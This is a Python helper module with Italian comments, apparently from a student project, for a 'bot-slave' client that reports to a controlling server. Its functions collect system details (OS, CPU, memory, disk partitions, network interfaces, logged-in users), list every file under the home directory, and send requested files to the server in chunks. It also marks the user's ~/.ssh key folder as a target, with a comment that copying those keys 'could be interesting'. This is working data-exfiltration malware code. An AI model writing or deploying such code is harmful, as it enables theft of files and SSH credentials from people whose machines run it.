"""
Codice sorgente contenente funzioni di supporto per il bot-slave.

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
# Librerie globali
import socket
from cpuinfo import get_cpu_info
from datetime import datetime as dt
import psutil
import platform
import asyncio
import os  # Utilizzato per il controllo dell'esistenza del file (Alternativamente è possibile utilizzare path -> path('dir/myfile.txt').abspath())
import sys
# from functools import partial  # Per comodità leggiamo il file da inviare in chunk di dati -> Sostituito con un iteratore
# from time import sleep

# Definiamo degli header custom per identificare il tipo di dato inviato al server
__headers_type = {"1": b"<File-Name>", "2": b"<File-Content>", "3": b"<File-Not-Found>",
                  "4": b"<OS-type>",
                  "5": b"<CPU-stats>", "5-1": b"<CPU-Brand>", "5-2": b"<CPU-Count>", "5-3": b"<CPU-Count-Logical>", "5-4": b"<CPU-Min-Freq>", "5-5": b"<CPU-Max-Freq>",
                  "6": b"<Ram-usage>", "6-1": b"<Ram-Current-Usage>", "6-2": b"<Ram-Total>",
                  "7": b"<Partition-disk-info>", "7-1": b"<Partition-Device>", "7-2": b"<Partition-MountPoint", "7-3": b"<Partition-FSType",
                  "8": b"<Partition-disk-status>", "8-1": b"<Partition-disk-read-status>", "8-2": b"<Partition-disk-write-status>",
                  "9": b"<Network-info>", "9-1": b"<Network-Interface>", "9-2": b"<Network-IP>", "9-3": b"<Network-NetMask>", "9-4": b"<Network-Broadcast>",
                  "10": b"<Users>", "10-1": b"<Users-Name>", "10-2": b"<Users-Active-Since>",
                  "11": b"<Content-Path>"}

__os_dict_types = {0: "linux", 1: "win32", 2: "darwin"}  # Partiamo da 0 in modo da porte accedere al'i-esimo elemento nella lista contenuta in __filesystem_hierarchy

__filesystem_hierarchy = {"Root": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
                          "Home": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
                          "SSH KEYS": [f"/home/{os.getlogin()}/.ssh/"],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
                          "Images": [],  # Recupero Immagini (?)
                          "Documents": [],  # Recupero Documenti (?)
                          }

"""
Per semplicità le funzioni utilizzate dal writer sono parametrizzate utilizzando i campi presenti negli __headers_type (per una migliore gestione dei casi)
"""


def get_operating_system() -> bytes:
    """Recupero informazioni del SO in esecuzione sulla macchina."""
    # Ritorniamo il campo con il maggior numero di informazioni possibili
    return (__headers_type["4"] + platform.platform().encode())  # example: Linux-5.15.0-50-generic-x86-64-with-glib2.35


def get_cpu_information() -> bytes:
    """Recupero informazioni sulla cpu della macchina."""
    # cpu_info = get_cpu_info()  # json with processor information
    # CPU Brand
    cpu_brand = get_cpu_info()['brand_raw']
    # Core info
    logical_core = psutil.cpu_count()
    physical_core = psutil.cpu_count(logical=False)

    # CPU Freq info
    min_cpu_freq = psutil.cpu_freq().min
    max_cpu_freq = psutil.cpu_freq().max

    return (__headers_type["5"] + __headers_type["5-1"] + cpu_brand.encode() + __headers_type["5-2"] + str(physical_core).encode() +  # Inviamo un struttura parametrizzata più semplice da gestire
            __headers_type["5-3"] + str(logical_core).encode() + __headers_type["5-4"] + str(min_cpu_freq).encode() + __headers_type["5-5"] + str(max_cpu_freq).encode())


def get_size(bytes, suffix="B") -> str:
    """Conversione di bytes in un formato Human readable."""
    """e.g: 1253656 => '1.20MB' 1253656678 => '1.17GB'"""
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def get_ram_size() -> bytes:
    """Recupero informazioni ram della macchina."""
    total_mem = psutil.virtual_memory().total
    used_mem = psutil.virtual_memory().used
    return (__headers_type["6"] + __headers_type["6-1"] + get_size(used_mem).encode() + __headers_type["6-2"] + get_size(total_mem).encode())


# Gestiamo il recupero e l'invio al server in place
async def get_partition_disk_info(writer: asyncio.StreamWriter) -> None:  # TODO: Controllare che funzioni anche con altri OS
    """Recupero informazioni del disco."""
    # NB: È obbligatorio fare un loop per ottenere le info di ogni partizione
    for partition in psutil.disk_partitions():
        if not partition.device.startswith("/dev/loop") and not partition.mountpoint.startswith("/var/snap"):  # In questo modo escludiamo i mount point di snap
            writer.write(__headers_type["7"] + __headers_type["7-1"] + partition.device.encode() +
                         __headers_type["7-2"] + partition.mountpoint.encode() + __headers_type["7-3"] + partition.fstype.encode())
            await asyncio.sleep(1)


def get_io_disk_statistics() -> bytes:
    """Recupero statistiche I/O del disco."""
    # get IO statistics since boot
    return(__headers_type["8"] + __headers_type["8-1"] + get_size(psutil.disk_io_counters().read_bytes).encode() +
           __headers_type["8-2"] + get_size(psutil.disk_io_counters().write_bytes).encode())


async def get_network_info(writer: asyncio.StreamWriter) -> None:  # TODO: Controllare che funzioni anche con altri OS
    """Recupero informazioni sulla rete."""
    for i_name, interface_addresses in psutil.net_if_addrs().items():
        for i_addr in interface_addresses:
            # Per evitare di ricevere errori nell'encoding di una variabile con NoneType facciamo uso di una variabile d'appoggio che controlla interattivamente il suo valore
            broadcast_ip = "None" if i_addr.broadcast is None else i_addr.broadcast
            netmask_ip = "None" if i_addr.netmask is None else i_addr.netmask
            writer.write(__headers_type["9"] + __headers_type["9-1"] + i_name.encode() + __headers_type["9-2"] + i_addr.address.encode() +
                         __headers_type["9-3"] + netmask_ip.encode() + __headers_type["9-4"] + broadcast_ip.encode())
            await asyncio.sleep(1)


async def get_users(writer: asyncio.StreamWriter) -> None:
    """Recupero della lista degli utenti presenti sulla macchina ospite."""
    for user in psutil.users():
        writer.write(__headers_type["10"] + __headers_type["10-1"] + user.name.encode() +
                     __headers_type["10-2"] + str(dt.fromtimestamp(user.started)).encode())
        await asyncio.sleep(1)


# Da preferire in quanto non restituisce nulla nel caso in cui si stia cercando di leggere una directory senza permessi
def get_path_content(content_path: str, sys_type: int) -> list:
    """Funzione per il recupero del contenuto di directory e file dato un path."""
    current_position = __filesystem_hierarchy.get(content_path)

    total_files = []
    for path, dirs, files in os.walk(current_position[sys_type]):
        for filename in files:
            total_files.append(os.path.join(path, filename))
    return total_files


async def send_file(request: str, size: int, writer: asyncio.StreamWriter):
    """Invio di uno specifico file dal client al server."""
    if os.path.exists(os.path.abspath(request)):  # Controlliamo che il file richiesto esista
        # Nel caso in cui il file esista calcoliamo una dimensione (utilizzato per definire la dimensione di ogni chunk) che rispetti il pacchetto che stiamo inviando al server
        final_size = size - len(__headers_type["1"]) - len(__headers_type["2"]) - len(request)
        with open(request, 'rb') as filename:
            for chunk in iter(lambda: filename.read(final_size), ""):
                if chunk:
                    # L'ogetto che riceverà il client sarà del tipo <File-Name>NOME_FILE<File-Content>CONTENUTO_FILE
                    writer.write(__headers_type["1"] + request.encode() + __headers_type["2"] + chunk)
                    await asyncio.sleep(2)  # Controllare se sia possibile diminuire lo sleep (o se sia invece obbligatorio aumentarlo)
                    print(f"Sent: {len(chunk)} bytes")
                else:
                    break
    else:
        print("Request failed")
        writer.write(__headers_type["3"] + request.encode())


async def send_dir_content(request: str, os_type: int, writer: asyncio.StreamWriter):
    """Gestione dell'invio del contenuto di uno specifico PATH richiesto dal server."""
    for files in get_path_content(request, os_type):  # Utilizziamo la variabile globale che viene settata all'avvio del client
        writer.write(__headers_type["11"] + files.encode())
        await asyncio.sleep(1)


# TODO: Modificare o espandere
def get_hostname() -> str:
    """Recupero info hostname."""
    return socket.gethostname()


# https://stackoverflow.com/questions/446209/possible-values-from-sys-platform
def os_type_initializer() -> int:
    """Funzione di inizializzazione del tipo di os."""
    os_type = sys.platform
    if os_type in __os_dict_types.values():
        # return __os_dict_types.index(os_type)
        return list(__os_dict_types.keys())[list(__os_dict_types.values()).index(os_type)]


def test_connection(hostname: str, port: int) -> bool:
    """Funzione di controllo per lo stato del server (in ascolto o meno)."""
    """Variante della funzione port_validator."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tester:
        try:
            if (tester.connect_ex((hostname, port)) == 0):
                print(f"Il server {hostname} sulla porta {port} è attualmente raggiungibile")
                return True
            else:
                print(f"Il server {hostname} sulla porta {port} non è attualmente raggiungibile.")
                return False
        except Exception as e:
            print(e)
